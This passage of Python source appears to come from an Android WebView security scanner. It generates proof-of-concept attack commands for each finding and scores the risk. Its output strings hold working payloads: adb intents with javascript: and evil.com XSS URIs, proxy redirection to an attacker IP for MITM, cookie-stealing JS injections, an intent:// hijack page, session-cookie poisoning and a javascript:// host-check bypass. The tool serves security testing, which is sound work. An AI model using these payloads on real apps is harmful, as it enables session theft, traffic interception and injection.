                    lines.append("")

                # JavaScript URI execution
                if wv.settings.javascript_enabled:
                    lines.append("# === ATTACK 5: Direct JavaScript Execution ===")
                    lines.append("# Execute JS directly via javascript: URI scheme")
                    lines.append(f"adb shell am start -n {full_component} \\")
                    lines.append(f'    --es "{param}" "javascript:alert(document.domain)"')
                    lines.append("")

            elif entry.get('type') == 'deep_link':
                data = entry.get('data', {})
                scheme = data.get('scheme', 'app')
                host = data.get('host', 'example.com')
                path = data.get('path', '/')

                lines.append(f"# Attack Chain via Deep Link: {chain.get('name')}")
                lines.append("")

                lines.append("# === ATTACK 1: XSS via Deep Link Parameter ===")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f'    -d "{scheme}://{host}{path}?{param}=https://evil.com/xss.html"')
                lines.append("")

                lines.append("# === ATTACK 2: JavaScript Execution via Deep Link ===")
                lines.append(f"adb shell am start -a android.intent.action.VIEW \\")
                lines.append(f'    -d "{scheme}://{host}{path}?{param}=javascript:alert(1)"')
                lines.append("")

        # MITM attack if SSL bypass
        if wv.ssl_bypass:
            lines.append("# === ATTACK 6: Man-in-the-Middle (SSL Bypass) ===")
            lines.append("# WebView accepts invalid certificates - full traffic interception possible")
            lines.append("")
            lines.append("# Step 1: Start mitmproxy")
            lines.append("mitmproxy -p 8080")
            lines.append("")
            lines.append("# Step 2: Configure device proxy")
            lines.append("adb shell settings put global http_proxy <attacker_ip>:8080")
            lines.append("")
            lines.append("# Step 3: All WebView HTTPS traffic is now intercepted")
            lines.append("# Even though certificate is invalid, app proceeds with connection")
            lines.append("")

        # evaluateJavascript injection attacks (Oversecured pattern)
        if wv.evaluate_js_injections:
            lines.append("# === ATTACK 7: JavaScript Injection via evaluateJavascript ===")
            lines.append("# String concatenation in evaluateJavascript allows JS injection")
            lines.append("")
            for inj in wv.evaluate_js_injections:
                lines.append(f"# Vulnerable at line {inj.get('line')}: evaluateJavascript(...+ {inj.get('variable')} + ...)")
            lines.append("")
            lines.append("# Payload example - if variable is user input:")
            lines.append("# Instead of: processData('user_input')")
            lines.append("# Inject:     processData(''); alert(document.cookie); //')")
            lines.append("#")
            lines.append("# Control the input to escape the string and inject arbitrary JS")
            lines.append("")

        # Intent scheme hijack attacks (Oversecured pattern)
        if wv.intent_scheme_handlers:
            for handler in wv.intent_scheme_handlers:
                if not handler.has_selector_check:
                    lines.append("# === ATTACK 8: Intent Scheme Hijacking ===")
                    lines.append("# Missing setSelector(null) allows arbitrary component launch")
                    lines.append("")
                    lines.append("# Craft malicious intent:// URL to launch internal component:")
                    lines.append("# HTML payload on attacker website:")
                    lines.append("")
                    lines.append("<html><body>")
                    lines.append(f'<a href="intent://#Intent;')
                    lines.append(f'  component={package}/.InternalActivity;')
                    lines.append(f'  S.sensitive_data=stolen;')
                    lines.append(f'  SEL;component={package}/.ExportedActivity;end">')
                    lines.append(f'  Click to exploit</a>')
                    lines.append("</body></html>")
                    lines.append("")
                    lines.append("# The SEL (selector) allows redirecting to any component")
                    lines.append("# even if the parsed intent targets a safe component")
                    lines.append("")

        # Cookie poisoning attacks (Oversecured pattern)
        if wv.cookie_issues:
            lines.append("# === ATTACK 9: Cookie Poisoning ===")
            lines.append("# Attacker-controlled URL allows setting cookies for any domain")
            lines.append("")
            for issue in wv.cookie_issues:
                lines.append(f"# Vulnerable at line {issue.get('line')}: setCookie({issue.get('url_variable')}, ...)")
            lines.append("")
            lines.append("# Attack scenario:")
            lines.append("# 1. Trigger app to set cookie for attacker-controlled URL")
            lines.append("# 2. URL points to legitimate domain: https://bank.com")
            lines.append("# 3. Attacker's cookie value overwrites victim's session")
            lines.append(f"adb shell am start -n {package}/.VulnerableActivity \\")
            lines.append('    --es "url" "https://bank.com" \\')
            lines.append('    --es "cookie" "session=attacker_session_token"')
            lines.append("")

        # JavaScript scheme bypass (Oversecured pattern)
        for load in wv.load_calls:
            if load.controllable and wv.settings.javascript_enabled:
                lines.append("# === ATTACK 10: JavaScript Scheme Bypass ===")
                lines.append("# Bypass host-based URL validation using javascript:// scheme")
                lines.append("")
                lines.append("# If app validates: url.getHost().equals('trusted.com')")
                lines.append("# Bypass with: javascript://trusted.com/%0aalert(document.cookie)")
                lines.append("#")
                lines.append("# The %0a (newline) causes the JS after it to execute")
                lines.append("# while the host check sees 'trusted.com'")
                lines.append("")
                if attack_chains:
                    chain = attack_chains[0]
                    entry = chain.get('entry_point') or {}
                    param = chain.get('payload_location', 'url')
                    if entry.get('type') == 'exported_activity':
                        component = entry.get('component', '')
                        full_component = f"{package}/{package}.{component}" if not '.' in component else f"{package}/{component}"
                        lines.append(f"adb shell am start -n {full_component} \\")
                        lines.append(f'    --es "{param}" "javascript://trusted.com/%0aalert(document.domain)"')
                        lines.append("")
                break

        return '\n'.join(lines)

    def _calculate_risk_score(self, wv: WebViewInstance, vulns: List[Dict]) -> int:
        """Calculate risk score 0-100 based on findings."""
        score = 0

        # Base scores for settings
        if wv.settings.javascript_enabled:
            score += 20
        if wv.settings.file_access:
            score += 15
        if wv.settings.universal_file_access:
            score += 30
        if wv.ssl_bypass:
            score += 25

        # Score for controllable URLs
        controllable_loads = sum(1 for l in wv.load_calls if l.controllable)
        score += min(controllable_loads * 15, 30)

        # Score for JS interfaces
        score += min(len(wv.js_interfaces) * 10, 20)

        # Severity multiplier
        critical_count = sum(1 for v in vulns if v['severity'] == 'Critical')
        high_count = sum(1 for v in vulns if v['severity'] == 'High')

        if critical_count > 0:
            score = min(score + 20, 100)
        if high_count > 0:
            score = min(score + 10, 100)

        return min(score, 100)
